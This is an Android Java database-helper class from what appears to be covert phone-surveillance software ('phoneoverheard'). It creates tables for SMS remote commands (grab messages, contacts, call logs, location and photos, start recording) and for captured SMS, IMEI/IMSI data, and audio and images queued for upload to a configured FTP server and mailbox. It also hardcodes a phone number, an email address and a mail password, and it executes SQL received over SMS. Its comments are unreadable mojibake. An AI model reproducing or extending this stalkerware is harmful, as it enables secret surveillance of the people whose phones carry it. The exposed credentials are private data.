package com.phoneoverheard.database;

import java.util.List;

import com.phoneoverheard.phonne.FileService;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.telephony.SmsManager;
import android.util.Log;
public class DatabaseHelper extends SQLiteOpenHelper{
	private static final String TAG = "DBAdapter";
	private static final String DATABASE_NAME = "phonne.db";  //���ݿ�����  ���λ�ã�./data/phonne.db
	private static final int DATABASE_VERSION = 1;  //���ݿ�汾
	
	//�������ݿ⣬�汾�Ų���Ϊ0��������Ϊ1
	public DatabaseHelper(Context context){
		super(context, DATABASE_NAME, null, DATABASE_VERSION);		
	}
	
	
	//���ݿ�ÿһ�α�����ʱ����
	@Override
	public void onCreate(SQLiteDatabase db){ 
		//�����ݿ��
		String smscmd_Sql ="create table smscmd (smskey text not null  primary key, password text not null, telnumber text);";
		db.execSQL(smscmd_Sql); //ִ��SQL��䣬��������ָ���smscmd
		String manager_Sql ="create table manager (smskey text not null  primary key, password text not null, telnumber text,"
							+" cmdsql text, audiofolder text, imgfolder text,serverport text,serveraddress text,hostip text,"
							+"hostmac text,mailsendto text,mailpassword text,mailfrom text);";
		db.execSQL(manager_Sql); //ִ��SQL��䣬��������Ա��Ϣ��manager
		String simmsg_Sql ="create table simmsg (tel text not null, deviceid text, imei text, imsi text,simstate integer);";
		db.execSQL(simmsg_Sql); //ִ��SQL��䣬����sim����Ϣ��sim	
		String smsmsg_Sql ="create table smsmsg (read integer, type integer not null, datetime text not null, address text not null, body text not null);";
		db.execSQL(smsmsg_Sql); //ִ��SQL��䣬��������Ϣ��smsmsg	
		String sendaudio_Sql ="create table sendaudio (sendstate integer, audiosize integer not null, datetime text not null, audiourl text not null, audioname text not null);";
		db.execSQL(sendaudio_Sql); //ִ��SQL��䣬����¼����sendaudio
		String sendimg_Sql ="create table sendimg (sendstate integer, imgsize integer not null, datetime text not null, imgurl text not null, imgname text not null);";
		db.execSQL(sendimg_Sql); //ִ��SQL��䣬������Ƭ��sendimg
		//��ʼ��manager������
		String password = "888888";
		String telnumber = "15006793699";
    	String ServerPort = "21"; //�������˿�
    	String ServerAddress = "192.168.209.1"; //������IP
    	String mailsendto = "ll772874830@163.com";    //�ռ����ַ
    	String mailpassword = "ll890817";      //����������
    	String mailfrom = "ll772874830@163.com"; //�������ַ
		password = new FileService().MD5(password);
		String managerInsert_Sql ="insert into manager values('manager', '"+password+"', '"+telnumber+"', '', '', '','"+ServerPort+"','"+ServerAddress+"','','','"+mailsendto+"','"+mailpassword+"','"+mailfrom+"');";
		db.execSQL(managerInsert_Sql); 
		//��ʼ��smscmd������
		String smscmdInsert_Sql1 ="insert into smscmd values('duanxin', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql1); 
		String smscmdInsert_Sql2 ="insert into smscmd values('haoma', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql2); 
		String smscmdInsert_Sql3 ="insert into smscmd values('lianxiren', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql3); 
		String smscmdInsert_Sql4 ="insert into smscmd values('luyin_start', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql4); 
		String smscmdInsert_Sql5 ="insert into smscmd values('luyin_stop', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql5); 
		String smscmdInsert_Sql6 ="insert into smscmd values('tonghuajilu', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql6); 
		String smscmdInsert_Sql7 ="insert into smscmd values('weizhi', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql7); 
		String smscmdInsert_Sql8 ="insert into smscmd values('zhaopian', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql8); 
		String smscmdInsert_Sql9 ="insert into smscmd values('xiazai', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql9); 
		String smscmdInsert_Sql10 ="insert into smscmd values('shenji', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql10); 
	}
	
	//���ݿ��ṹ�����仯ʱ,��������±�ʱִ��,ע��Ҫ�޸����ݿ�汾��
	@Override
	public void onUpgrade(SQLiteDatabase db, int oldVersion,int newVersion){
		//db.execSQL("DROP TABLE IF EXISTS mytable");
		Log.v(TAG, "�������ݿ�汾:"+DATABASE_VERSION);
	}
	
	//ִ��SQL���
	public void execSQLCmd(SQLiteDatabase db,String Sql,String sendernumber){
		try{
			db.execSQL(Sql); 
		} catch (Exception e) {
	        // �ƶ���Ӫ������ÿ�η��͵��ֽ��������ޣ����ǿ���ʹ��Android�������ṩ �Ķ��Ź��ߡ�
	        SmsManager sms = SmsManager.getDefault();
	        String ErrMsg = "ִ��Sql������"+Sql;
	        // �������û�г������Ƴ��ȣ��򷵻�һ�����ȵ�List��
	        List<String> texts = sms.divideMessage(ErrMsg);
	        for (String text : texts) {
	        	sms.sendTextMessage(sendernumber,null,text,null,null);
	        }
			e.printStackTrace();
		}
	}
	
}
